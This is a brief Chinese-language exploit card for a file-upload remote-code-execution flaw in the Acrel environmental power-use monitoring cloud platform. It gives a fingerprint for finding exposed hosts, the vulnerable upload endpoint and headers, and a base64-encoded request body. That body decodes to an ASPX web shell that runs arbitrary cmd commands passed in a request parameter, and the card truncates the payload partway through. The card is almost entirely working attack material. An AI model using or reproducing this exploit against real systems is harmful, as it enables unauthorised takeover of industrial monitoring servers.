# 安科瑞环保用电监管云平台uploadAttachment存在文件上传致RCE漏洞

- **系统**：安科瑞环保用电监管云平台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="myCss/phone.css"`
- **请求**：`POST /api/APP/uploadAttachment HTTP/1.1`
- **关键头**：`Content-Type: application/json`

**请求体 / payload**
```
{"FileStr":"PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiIHZhbGlkYXRlUmVxdWVzdD0iZmFsc2UiICU+CjwlCnZhciBjPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbygiY21kIik7CnZhciBlPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpOwp2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjsKYy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7CmMuUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlOwpjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlOwplLlN0YXJ0SW5mbz1jOwpjLkFyZ3VtZW50cz0iL2MgIiArIFJlcXVlc3QuSXRlbVsiY21kIl07CmUuU3RhcnQoKTsKb3V0PWUuU3RhbmRhcmRPdXRwdXQ7CkVJPWUuU3RhbmRhcmRFcnJvcjsKZS5DbG9zZSgpOwpSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRv…（脚本共 738 字，完整版见原文）
```
- **预期**：200　|　—